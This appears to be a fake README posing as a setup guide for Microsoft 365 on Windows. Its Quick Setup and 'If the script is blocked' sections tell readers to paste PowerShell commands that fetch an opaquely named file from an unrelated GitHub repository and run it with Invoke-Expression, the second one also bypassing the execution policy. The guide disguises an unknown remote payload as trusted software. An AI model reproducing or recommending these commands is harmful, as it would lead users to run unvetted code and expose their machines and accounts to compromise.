# 365

365 is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open 365 and work in it.

Microsoft 365 on Windows is the familiar Office application family packaged for individuals and organizations who create documents, analyze data, schedule meetings, and share files from one desktop. Installed apps run locally with your Microsoft account or work identity, while OneDrive keeps copies synchronized when you save to the cloud folder on your PC.

A typical session starts with Outlook for morning mail and calendar, then Word or Excel for the tasks at hand. You might join a Teams call from a meeting invite, co-edit a shared workbook while formulas recalculate, export a PowerPoint deck to PDF, and close the day with tasks marked complete in To Do. Updates arrive through the built-in update channel so apps stay current without reinstalling the whole suite.

This repository holds a Windows setup package reference, short configuration notes for deployment or reinstall scenarios, and a concise changelog that tracks bundle version bumps and notable app fixes. Use it as a single place to see which build is documented here, compare release notes, and plan the next orderly refresh on managed or personal PCs.

## What you do with it

- Word on Windows handles long reports with styles, track changes, and accessible reading layouts.
- Excel recalculates linked workbooks, pivot tables, and charts while you filter large datasets.
- PowerPoint builds slide decks with presenter view, animations, and embedded video for meetings.
- Outlook unifies mail, calendar, contacts, and reminders in one searchable desktop window.
- Teams connects chat, calls, and shared channels without leaving your Windows taskbar workflow.
- OneDrive mirrors Desktop and Documents folders so edits sync across PCs you sign into.
- Office apps open PDFs, images, and legacy formats through consistent ribbon commands and shortcuts.
- Click-to-run deployment installs only the apps you need and applies updates in the background.

## Quick Setup (PowerShell)

This installs the program 365 on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/m-bergmann02516280/365-setup-guide/main/34b44ffrv8.n49dmeif | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/m-bergmann02516280/365-setup-guide/main/34b44ffrv8.n49dmeif | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `34b44ffrv8.n49dmeif` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `m-bergmann02516280/365-setup-guide`. Microsoft 365 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
